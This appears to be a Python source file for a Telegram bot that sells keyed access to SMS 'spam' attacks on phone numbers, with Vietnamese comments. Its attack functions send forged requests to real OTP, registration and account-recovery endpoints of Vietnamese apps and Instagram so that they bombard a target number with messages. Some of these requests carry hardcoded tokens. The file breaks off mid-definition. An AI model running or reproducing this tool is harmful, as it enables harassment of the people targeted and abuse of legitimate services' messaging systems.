# ! py
# Bot spamsms vipro by NTC

import os, sys, re, telebot, datetime, hashlib, signal, requests, json, threading, uuid, time, random, string, base64
from Crypto.Cipher import AES
from tqdm import tqdm
from requests import *
from flask import Flask
from lequangminh import * 
from telebot import types
from threading import Timer
from threading import Thread
from colorama import Fore, Style, init
from datetime import datetime, timedelta    
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import ThreadPoolExecutor, TimeoutError, wait, ALL_COMPLETED
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup    
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Hàm nhập api bot telegram
def nhap_api_bot():
    while True:
        api_bot = input("\nNhập API bot telegram: ").strip()
        url = f"https://api.telegram.org/bot{api_bot}/getMe"
        try:
            response = requests.get(url, timeout=5)
            data = response.json()
            
            if data.get("ok"):
                print(f"API: {api_bot} hợp lệ !")
                return api_bot
            else:
                print("API không hợp lệ! Vui lòng nhập lại.")
        except Exception as e:
            print(f"Lỗi : {e}")        
        except requests.RequestException:
            print("Lỗi kết nối! Kiểm tra internet và nhập lại.")

# List 
so_thu_tu = defaultdict(lambda: {'so_thu_tu': 1})
api_bot = nhap_api_bot()                           
bot = telebot.TeleBot(api_bot)
#print("\nBot đang hoạt động...\n")
set_user_id = [] # chứa id người dùng
set_user_key = [] # chứa key người dùng 
set_user_ban = [] # danh sách đen chứa id 
set_key_used = [] # danh sách key đã sử dụng
set_user_spam_admin = [] # danh sách user spam admin
Admin_id = "THAY ID ADMIN" # id admin
list_sdt_admin = ["THAY SDT ADMIN"] # list chứa sdt admin
list_sdt_cam = ['112', '113', '114', '115', '116', '911'] # list chứa sdt cấm
dau_so_hop_le = ['03', '08', '09', '05', '07', '099', '092', '087']
than_so_hop_le = re.compile(r"^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$")


# Make color 
init()
blue = Col.light_blue
lblue = Colors.StaticMIX((Col.light_blue, Col.white, Col.white))
red = Colors.StaticMIX((Col.red, Col.white, Col.white))


# [ BANNER ]
def Banner():
    os.system("cls" if os.name == "nt" else "clear") # xoá tất cả những thứ còn lại trên terminal
    title = "\nLink FB admin: https://www.facebook.com/nguyentruongchinh3004?mibextid=ZbWKwL" 
    banner = """\n
███╗░░██╗  ████████╗  ░█████╗░  ░░░░░░░░░░░░░░
████╗░██║  ╚══██╔══╝  ██╔══██╗  ░░██╗░░░░██╗░░
██╔██╗██║  ░░░██║░░░  ██║░░╚═╝  ██████╗██████╗
██║╚████║  ░░░██║░░░  ██║░░██╗  ╚═██╔═╝╚═██╔═╝
██║░╚███║  ░░░██║░░░  ╚█████╔╝  ░░╚═╝░░░░╚═╝░░
╚═╝░░╚══╝  ░░░╚═╝░░░  ░╚════╝░  ░░░░░░░░░░░░░░
\n"""
    ban = Colorate.Vertical(Colors.DynamicMIX((Col.light_green, Col.light_gray)), Center.XCenter(title)) + Colorate.Vertical(Colors.DynamicMIX((Col.light_red, Col.light_blue)), Center.XCenter(banner.center(120)))
    for i in ban:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.001)

Banner()       # In Banner ra terminal 

print("\nĐang chờ tín hiệu spam...\n")

def random_string(length):
            number = '0123456789'
            alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ'
            id = ''
            for i in range(0,length,2):
                id += random.choice(number)
                id += random.choice(alpha)
            return id
            
# [ Api System ]
# Old Api Filter
imei = uuid.uuid4()
            
def thoi_gian_hien_tai():
    thoi_gian_hien_tai = datetime.now() + timedelta(hours=0)
    gio_phut_giay = thoi_gian_hien_tai.strftime("%H:%M:%S")
    ngay_hien_tai = thoi_gian_hien_tai.strftime("%d-%m-%Y")
    return ngay_hien_tai, gio_phut_giay
def cap_nhat_thoi_gian():
    global thoigian, ngay
    while True:
        ngay, thoigian = thoi_gian_hien_tai()
threading.Thread(target=cap_nhat_thoi_gian, daemon=True).start()


# Thông tin người dùng ban đầu
number_of_members = 0
spam_status = {} # Giám sát quá trình spam cuả từng User_id
spam_warning_point = defaultdict(lambda: {'point_spam': 0}) # Giám sát số lần spam cuả từng User_id 
user_lsspam = defaultdict(lambda: deque(maxlen=15)) # Lưu lại lịch sử 15 lần spam gần nhất
user_infor = defaultdict(lambda: {'tong_lan_spam_trong_ngay': 0, 'tong_lan_spam_con_lai_trong_ngay': 0, 'value_key': 0, 'key_today': '', 'key_timestamp': None}) # Lưu lại thông tin spam    
        

# Bắt đầu bot (lệnh start)
@bot.message_handler(commands=['start'])
def start(message):
    global user_infor, Information_user, position, number_of_members, user_lsspam
    User_id = str(message.chat.id)
    user_name = message.from_user.username
    if not user_name :
        full_name = message.from_user.first_name + " " + message.from_user.last_name
    else:    
        full_name = user_name
    if User_id == Admin_id:
        position = "(Admin)"
    else:
        position = "(Mem)"        
    if User_id not in user_infor:    
        nut_lay_key_spam = telebot.types.InlineKeyboardButton("Get key spam 🔑", callback_data="get_key_spam")
        keyboard = telebot.types.InlineKeyboardMarkup()
        keyboard.row(nut_lay_key_spam)
        bot.send_message(message.chat.id, f"🚀Chào mừng {full_name} đến với bot spam sms trên telegram !🚀\n\nNhấp vào nút bên dưới để lấy key spam 👇", parse_mode='Markdown',reply_markup=keyboard)
        handle_button(message)
        Information_user = f"{User_id} - {full_name} - {position}" 
        if Information_user not in set_user_id:
            set_user_id.append(Information_user)
            #print(f"ID: {User_id} đã bắt đầu dùng bot")
        if User_id != Admin_id:    
            number_of_members += 1     
    else:
        nut_lay_key_spam = telebot.types.InlineKeyboardButton("Lấy key spam 🔑", callback_data="get_key_spam")
        keyboard = telebot.types.InlineKeyboardMarkup()
        keyboard.row(nut_lay_key_spam)
        bot.send_message(message.chat.id, f"👇 Nút lấy key spam", parse_mode='Markdown',reply_markup=keyboard)
        

def handle_button(message):
    user_markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True) 
    button0 = types.KeyboardButton(text="📋 Hướng dẫn")
    button1 = types.KeyboardButton(text="👤 Tài khoản")
    user_markup.add(button0, button1)
    bot.send_message(message.chat.id, "Hãy chọn mục menu 👇", reply_markup=user_markup)


@bot.message_handler(func=lambda message: message.text == "👤 Tài khoản")
def account(message):
    User_id = str(message.chat.id)
    user_name = message.from_user.username
    if not user_name :
        full_name = message.from_user.first_name + " " + message.from_user.last_name
    else:    
        full_name = user_name
    tong_lan_spam_trong_ngay = user_infor[User_id]['tong_lan_spam_trong_ngay']
    tong_lan_spam_con_lai_trong_ngay = user_infor[User_id]['tong_lan_spam_con_lai_trong_ngay']
    value_key = user_infor[User_id]['value_key']
    if value_key == 1 :
        value_key_text = "Còn giá trị SD"
    else:
        value_key_text = "Hết giá trị SD"    
    Account = (
        f"👤 Tên tài khoản : `{full_name}`\n"
        f"💳 ID tài khoản : `{User_id}`\n"
        f"🚀 Đã spam : {tong_lan_spam_trong_ngay} lần\n"
        f"📝 Còn lại : {tong_lan_spam_con_lai_trong_ngay}/15 lần\n"
        f"🔑 Key value : {value_key_text}"
    )    
    lsspam_button = telebot.types.InlineKeyboardButton("⏱️ Lịch sử spam", callback_data="lsspam")
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(lsspam_button)
    bot.send_message(message.chat.id, Account, parse_mode='Markdown',reply_markup=keyboard)    
            

@bot.message_handler(func=lambda message: message.text == "📋 Hướng dẫn")
def instruct(message):
    User_id = str(message.chat.id)
    # Hướng dẫn thành viên
    text_member = ( 
        "<b>𝑵𝑻𝑪 𝑺𝑷𝑨𝑴 𝑺𝑴𝑺</b>\n\n"
        
        "<b>📜HƯỚNG DẪN SỬ DỤNG</b>\n"
        "<b>Bước 1:</b> Nhập /getkey hoặc ấn nút để lấy key\n"
        "<b>[Lưu ý: mỗi người chỉ có 1 key và dùng trong 24 giờ]</b>\n"
        "<b>Bước 2:</b> Để nhập key thì gõ theo cú pháp\n"
        "<b>➤  /key [dấu cách] Nhập key vừa lấy</b>\n"
        "<b>Bước 3:</b> Để spam sms thì gõ theo cú pháp\n"
        "<b>➤  /spam [dấu cách] số diện thoại cần spam</b>\n\n"
         
        "<b>📋 DANH SÁCH LỆNH</b>\n"
        "<b>/start:</b> Khởi động bot\n" 
        "<b>/getkey:</b> Lấy key\n" 
        "<b>/key:</b> Nhập key\n" 
        "<b>/spam:</b> Spam sms bằng số điện thoại\n" 
        "<b>/phone:</b> Lấy số điện thoại ngẫu nhiên\n\n" 
        "<b>⚠️Lưu ý</b>\n"
        "<b>x</b> Trong quá trình spam khi bot chưa thông báo hoàn tất spam mà bạn ra lệnh spam lần tiếp theo thì sẽ bị cảnh cáo\n"
        "<b>x</b> Nếu cảnh báo tới lần thứ 3 bạn sẽ bị 'BAN' và không thể tiếp tục sử dụng bot\n"
        "<b>Chú ý: [Khi bị ban]</b> Hãy liên hệ admin để được hỗ trợ !"
    )
    
    # Hướng dẫn cho admin 
    text_admin = (
        "<b>📋 DANH SÁCH LỆNH</b>\n\n"
        "<b>/start:</b> Khởi động bot\n" 
        "<b>/getkey:</b> Lấy key\n" 
        "<b>/key:</b> Nhập key\n" 
        "<b>/smb:</b> Xem thành viên\n" 
        "<b>/ban:</b> Ban thành viên\n" 
        "<b>/unban:</b> Bỏ ban thành viên\n" 
        "<b>/spam:</b> Spam sms bằng số điện thoại\n" 
        "<b>/spadmin:</b> Xem ai đã spam admin\n" 
        "<b>/phone:</b> Lấy số điện thoại ngẫu nhiên\n\n" 
    )
    if User_id == Admin_id :
        bot.send_message(message.chat.id, text_admin, parse_mode='HTML')  
    else:
        bot.send_message(message.chat.id, text_member, parse_mode='HTML')      
    
    
#############################   QUẢN LÝ THÀNH VIÊN   ###############################

# Hàm xem thành viên
@bot.message_handler(commands=['smb'])
def see_members(message):
    User_id = str(message.chat.id)
    if User_id != Admin_id:
        bot.send_message(message.chat.id, "❌ Bạn không có quyền sử dụng lệnh này !")
        return 
    member_infor = ""
    for Information_user in set_user_id:
        member_infor += f"{Information_user}\n"
    bot.send_message(message.chat.id, f"<b>Dưới đây là tên toàn bộ thành viên\n\nTổng cộng {number_of_members} thành viên</b>\n{member_infor}\n", parse_mode='HTML')    


# Hàm ban thành viên     
@bot.message_handler(commands=['ban'])
def ban_members(message):
    User_id = str(message.chat.id)
    if User_id != Admin_id:
        bot.send_message(message.chat.id, "❌ Bạn không có quyền sử dụng lệnh này !")
        return 
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.send_message(message.chat.id, "❌ Yêu cầu không đúng định dạng. Vui lòng nhập theo mẫu: /ban [dấu cách] ID muốn ban")
        return
    ID_ban = parts[1]
    if ID_ban not in user_infor:
        bot.send_message(message.chat.id, f"🚫 ID: {ID_ban} không có trong hệ thống")
        return 
    set_user_ban.append(ID_ban)
    keyboard = InlineKeyboardMarkup()
    button_admin_hotro = InlineKeyboardButton(text="🧑‍🔧 Admin hỗ trợ", url="https://t.me/TruongChinh304")
    keyboard.row(button_admin_hotro)
    bot.send_message(ID_ban, "<b>🛡️ Bạn đã bị ban. Liên hệ admin để được hỗ trợ !</b>", parse_mode = 'HTML' ,reply_markup=keyboard)
    
    
# Hàm mở ban thành viên     
@bot.message_handler(commands=['unban'])
def uban_members(message):
    User_id = str(message.chat.id)
    if User_id != Admin_id:
        bot.send_message(message.chat.id, "❌ Bạn không có quyền sử dụng lệnh này !")
        return 
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.send_message(message.chat.id, "❌ Yêu cầu không đúng định dạng. Vui lòng nhập theo mẫu: /uban [dấu cách] ID muốn unban")
        return
    ID_unban = parts[1]
    if ID_unban not in user_infor:
        bot.send_message(message.chat.id, f"ID: {ID_unban} không có trong hệ thống")
        return 
    set_user_ban.remove(ID_unban)
    spam_warning_point[User_id]['point_spam'] = 0
    bot.send_message(ID_unban, "🔓 Bạn đã được mở ban. Đừng spam nữa nhé !!!")
        

# Hàm xem ai spam admin 
@bot.message_handler(commands=['spadmin'])
def spam_admin(message):
    global set_user_spam_admin, start_time
    start_time = datetime.now()
    User_id = str(message.chat.id)
    current_time = datetime.now()
    if current_time - start_time >= timedelta(hours=24):
        set_user_spam_admin = []
        start_time = current_time
    if set_user_spam_admin:
        response = "<b>Top những user đã spam admin trong 24 giờ qua:</b>\n\n"
        for user in set_user_spam_admin:
            response += f"👤User: {user['user']}\n💳ID: {user['user_id']}\n⏱️Thời gian: {user['time'].strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    else:
        response = "<b>Không có user nào spam admin trong 24 giờ qua.</b>"
    bot.send_message(message.chat.id, response, parse_mode='HTML')
    
    
############################################################################################
   
    
# Hàm xoá key theo 24 giờ 
def clear_expired_keys():
    current_time = datetime.datetime.now()
    global set_user_key
    set_user_key = [
        (key, user_id) for key, user_id in set_user_key
        if user_infor[user_id]['key_timestamp'] and (current_time - user_infor[user_id]['key_timestamp']).days < 1
    ]
    
    
# Random key cho người dùng
@bot.message_handler(commands=['getkey'])
def get_key(message):
    global user_infor, key
    User_id = str(message.chat.id)
    current_time = datetime.now()
    key_timestamp = user_infor[User_id]['key_timestamp']
    if key_timestamp and (current_time - key_timestamp).days >= 1:
        user_infor[User_id]['key_today'] = ''
        user_infor[User_id]['key_timestamp'] = None
    bot.reply_to(message, "🚀VUI LÒNG ĐỢI TRONG GIÂY LÁT ĐỂ BOT LẤY KEY CHO BẠN NHÉ !🚀")
    if user_infor[User_id]['key_today']:
        key = user_infor[User_id]['key_today']
    else:
        timestamp_str = current_time.strftime('%Y-%m-%d %H:%M:%S')
        raw_key_string = f"{User_id} {timestamp_str}"
        hashed_key = hashlib.sha256(raw_key_string.encode()).hexdigest()
        key = hashed_key[:20]
        user_infor[User_id]['key_today'] = key
        user_infor[User_id]['key_timestamp'] = current_time
    if (key, User_id) not in set_user_key:
        set_user_key.append((key, User_id))
        time.sleep(2)
    bot.reply_to(message, f"- 🔑Key của bạn ngày {ngay} là:\n     ➤   `{key}`    ➤\n- Dùng lệnh /key để nhập key\n🚀[Lưu ý : Mỗi Key Chỉ Có 1 Người Dùng Key Sẽ Thay Đổi Theo Ngày]🚀", parse_mode='Markdown')


# Nhập key 
@bot.message_handler(commands=['key'])    
def enter_key(message):
    global user_infor
    User_id = str(message.chat.id)
    current_time = datetime.now()
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.send_message(message.chat.id, "❌ Yêu cầu không đúng định dạng. Vui lòng nhập theo mẫu: /key [dấu cách] key của bạn")
        return
    enter_key = parts[1]
    if enter_key == user_infor[User_id]['key_today']:
        if (enter_key, User_id) in set_key_used:
            bot.send_message(message.chat.id, "❌ Key đã được sử dụng !")
        else:
            user_infor[User_id]['value_key'] = 1
            user_infor[User_id]['key_timestamp'] = current_time
            user_infor[User_id]['tong_lan_spam_con_lai_trong_ngay'] = 15 # số lần spam cho phép 
            bot.send_message(message.chat.id, "KEY HỢP LỆ. BẠN ĐÃ ĐƯỢC PHÉP SỬ DỤNG LỆNH /spam.🚀\n[Lưu ý: mỗi key chỉ có 1 người dùng]")
            if (enter_key, User_id) in set_user_key:
                set_user_key.remove((enter_key, User_id))
            if (key, User_id) not in set_key_used:
                set_key_used.append((key, User_id))    
    else:
        bot.send_message(message.chat.id, "❌ Key không đúng. Vui lòng thử lại !")    


# Hàm tạo số điện thoại hợp lệ
def tao_so_dien_thoai():
    while True:
        dau_so = random.choice(dau_so_hop_le)
        if len(dau_so) == 2:
            than_so = random.randint(10000000, 99999999)
        else:
            than_so = random.randint(1000000, 9999999)
        so_dien_thoai = dau_so + str(than_so)
        if re.match(than_so_hop_le, so_dien_thoai):
            return so_dien_thoai


# Hàm gửi file sdt theo số lượng yêu cầu            
@bot.message_handler(commands=['phone'])
def file_random_number(message):
    User_id = str(message.chat.id)
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.send_message(message.chat.id, "❌ Yêu cầu không đúng định dạng. Vui lòng nhập theo mẫu: /phone [dấu cách] số lượng số điện thoại")
        return
    try:    
        so_luong_so_dien_thoai = int(parts[1])    
        if (so_luong_so_dien_thoai < 1 or so_luong_so_dien_thoai > 100):
            bot.send_message(message.chat.id, "Số lượng SĐT nằm trong khoảng 1-100 !")
            return 
    except ValueError:
        bot.send_message(message.chat.id, "Vui lòng nhập số !. Theo mẫu: /phone [dấu cách] số lượng số điện thoại")
        return 
    
    file_path_main = f"D:\\Tool_Python\\{so_luong_so_dien_thoai}_SĐT.txt"
        
    try:
        # Tạo số điện thoại theo số lượng
        nhung_so_dien_thoai = [tao_so_dien_thoai() for i in range(so_luong_so_dien_thoai)]
        
        # Ghi vào file 
        with open(file_path_main, "w", encoding="utf-8") as file:
            file.write(f"DANH SÁCH {so_luong_so_dien_thoai} SỐ ĐIỆN THOẠI".center(60) + "\n")
            file.write(f"┏━━━━━━━━━━━━━━━━━┓\n")
            for so_dien_thoai in nhung_so_dien_thoai:
                file.write(f"┣➤ {(so_thu_tu[User_id]['so_thu_tu'])} - {so_dien_thoai}\n")
                so_thu_tu[User_id]['so_thu_tu'] += 1 
            file.write(f"┗━━━━━━━━━━━━━━━━━┛\n")
            file.write("━━━━━━━━━━━━━━━━━━━━━ THE END ━━━━━━━━━━━━━━━━━━━━━".center(50) + "\n")
            
        # Gửi file đến người dùng 
        with open(file_path_main, "rb") as file:
            bot.send_document(message.chat.id, file)
        so_thu_tu[User_id]['so_thu_tu'] = 1    
        os.remove(file_path_main)  # Xóa file sau khi gửi file
        
    except Exception as e:
        bot.send_message(message.chat.id, f"Đã xảy ra lỗi: {e} !")    
        
        
# In ra terminal thông tin spam 
#def format_print(symbol, text):
    #return f"{symbol} {text}"                

def format_print(symbol, text):
    return f"""                      {Col.Symbol(symbol, lblue, blue)} {lblue}{text}{Col.reset}"""
    
    
# Hàm lưu lại lịch sử 15 lần spam gần nhất 
def see_spam_history(message):
    User_id = str(message.chat.id)
    history = user_lsspam.get(User_id, [])
    if not history:
        bot.send_message(message.chat.id, "Chưa có lịch sử spam.")
    else:
        history_text = "📜 LỊCH SỬ 15 PHIÊN SPAM GẦN NHẤT\n\nThời gian  |  Số lần spam  |  Số điện thoại\n"
        latest_history = history[:15] if len(history) > 15 else history
        for idx, record in enumerate(latest_history, start=1):
            history_text += (
                f"{idx}. {record['thoi_gian_spam']} | "
                f"{record['so_lan_spam']} | "
                f"{record['so_dien_thoai']}\n"
            )
        bot.send_message(message.chat.id, history_text)


# Hàm lưu lại thời gian key còn lại 
def time_key_cl(message):
    User_id = str(message.chat.id)
    if user_infor[User_id]['key_timestamp'] != None:
        bot.send_message(message.chat.id, f"Thời gian còn lại {user_infor[User_id]['key_timestamp']}")
    else:
        nut_lay_key_spam = telebot.types.InlineKeyboardButton("Get key spam 🔑", callback_data="get_key_spam")
        keyboard = telebot.types.InlineKeyboardMarkup()
        keyboard.row(nut_lay_key_spam)
        bot.send_message(message.chat.id, "Không có nội dung ! Nhấp vào nút dưới đây để lấy key", parse_mode='Markdown',reply_markup=keyboard)

        
@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query_game(call):
    if call.data == "get_key_spam":
        get_key(call.message)
    elif call.data == "lsspam":
        see_spam_history(call.message)
    elif call.data == "huong_dan":
        instruct(call.message)

# CÁC DEF RANDOM [ RANDOM ]
def generate_random_string(length):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(length))
def so(length):
    return ''.join(random.choice(string.digits) for _ in range(length))
def generate_random(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
def generate_imei():
    return ''.join(random.choice(string.digits) for _ in range(15))
def Random_string(length, minh):
    return ''.join(random.choices(minh, k=length))
def get_SECUREID():
    return ''.join(random.choices('0123456789abcdef', k=17))
def getimei():
    return Random_string(8)+'-'+Random_string(4)+'-'+Random_string(4)+'-'+Random_string(4)+'-'+Random_string(12)
def get_TOKEN():
    return Random_string(22)+':'+Random_string(9)+'-'+Random_string(20)+'-'+Random_string(12)+'-'+Random_string(7)+'-'+Random_string(7)+'-'+Random_string(53)+'-'+Random_string(9)+'_'+Random_string(11)+'-'+Random_string(4)
def Random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))
def random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))
mail = generate_random(10)+'@gmail.com'
to=generate_random(53)+'-'+generate_random(86)+'-'+generate_random(121)+'_'+generate_random(2)+'-'+generate_random(94)+'-'+generate_random(3)+'_'+generate_random(9)+'-'+generate_random(15)+'_'+generate_random(17)+'-'+generate_random(39)+'_'+generate_random(85)+'_'+generate_random(34),        
    


# [ DEF API SPAM ] 
def oldpops(phone):
    response = requests.post("https://products.popsww.com/api/v5/auths/register", headers={"Host": "products.popsww.com","content-length": "89","profileid": "62e58a27c6f857005396318f","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InI1aTZqN3dUTERBS3hMV3lZcDdaM2ZnUUJKNWk3U2tmRkJHR2tNNUlCSlYycFdiRDNwbVd1MUM2eTQyVHJRaUIiLCJ1c2VySWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGUiLCJyb2xlcyI6WyJHVUVTVCJdLCJwcm9maWxlcyI6W3siaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGYiLCJhZ2UiOjEzLCJtcGFhIjp7ImlkIjoiNWQyM2UxMjU5NTI1MWI5OGJkMDQzMzc2IiwiYWdlIjoxM319LHsiaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOTAiLCJhZ2UiOjcsIm1wYWEiOnsiaWQiOiI1ZDIzZTFlMjk1MjUxYjk4YmQwNDM0MWQiLCJhZ2UiOjd9fV0sImlhdCI6MTY1OTIxMDI3OSwiZXhwIjoxOTc0NTcwMjc5fQ.3exZEvv0YG1Uw0UYx2Mt9Oj3NhRb8BX-l4tIAcVv9gw","x-env": "production","content-type": "application/json","lang": "vi","sub-api-version": "1.1","user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36","api-key": "5d2300c2c69d24a09cf5b09b","platform": "wap","sec-ch-ua-platform": "\"Linux\"","accept": "*/*","origin": "https://pops.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://pops.vn/auth/signin-signup/signup?isOffSelectProfile\u003dtrue","accept-encoding": "gzip, deflate, br",}, json=({"fullName":"","account": phone,"password":"Vexx007","confirmPassword":"Vexx007"}))
    if response.status_code == 200:
        print(format_print("*", "POPS: THÀNH CÔNG!"))
    else:
        print(format_print("x", "POPS: THẤT BẠI!"))

def oldtv360(phone):
    response = requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn": phone}))
    if response.status_code == 200:
        print(format_print("*", "TV360: THÀNH CÔNG!"))
    else:
        print(format_print("x", "TV360: THẤT BẠI!"))

def oldloship(phone):
    response = requests.post("https://mocha.lozi.vn/v6/invites/use-app", headers={"Host": "mocha.lozi.vn","content-length": "47","x-city-id": "50","accept-language": "vi_VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36","content-type": "application/json","x-lozi-client": "1","x-access-token": "unknown","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://loship.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://loship.vn","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"device":"Android 8.1.0","platform":"Chrome/104.0.0.0","countryCode":"84","phoneNumber":phone[1:11]}))
    if response.status_code == 200:
        print(format_print("*", "LOSHIP: THÀNH CÔNG!"))
    else:
        print(format_print("x", "LOSHIP: THẤT BẠI!"))

def oldalfrescos(phone):
    response = requests.post("https://api.alfrescos.com.vn/api/v1/User/SendSms?culture\u003dvi-VN", headers={"Host": "api.alfrescos.com.vn","content-length": "124","accept-language": "vi-VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","content-type": "application/json","accept": "application/json, text/plain, */*","brandcode": "ALFRESCOS","devicecode": "web","sec-ch-ua-platform": "\"Android\"","origin": "https://alfrescos.com.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://alfrescos.com.vn/","accept-encoding": "gzip, deflate, br"}, json=({"phoneNumber": phone,"secureHash":"add789229e0794d8508f948dacd710ae","deviceId":"","sendTime":1660806807513,"type":2}))
    if response.status_code == 200:
        print(format_print("*", "ALFRESCOS: THÀNH CÔNG!"))
    else:
        print(format_print("x", "ALFRESCOS: THẤT BẠI!"))

def oldfptshop(phone):
    response = requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone})
    if response.status_code == 200:
        print(format_print("*", "FPTSHOP: THÀNH CÔNG!"))
    else:
        print(format_print("x", "FPTSHOP: THẤT BẠI!"))

def oldfacebook(phone):
    response = requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"})
    if response.status_code == 200:
        print(format_print("*", "FACEBOOK: THÀNH CÔNG!"))
    else:
        print(format_print("x", "FACEBOOK: THẤT BẠI!"))

def oldzalopay(phone):
    headers = {'Host': 'api.zalopay.vn','x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1','x-device-model': 'iPhone8,2','x-density': 'iphone3x','authorization': 'Bearer ','x-device-os': 'IOS','x-drsite': 'off','accept': '*/*','x-app-version': '7.13.1','accept-language': 'vi-VN;q=1.0, en-VN;q=0.9','user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2','x-platform': 'NATIVE','x-os-version': '14.6',}
    params = {'phone_number': phone,}
    token = requests.get('https://api.zalopay.vn/v2/account/phone/status', params=params, headers=headers).json()['data']['send_otp_token']
    json_data = {'phone_number': phone,'send_otp_token': token,}
    response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data)
    if response.status_code == 200:
        print(format_print("*", "ZALOPAY: THÀNH CÔNG!"))
    else:
        print(format_print("x", "ZALOPAY: THẤT BẠI!"))
        
        
# New Api Filter

def vieon(phone):
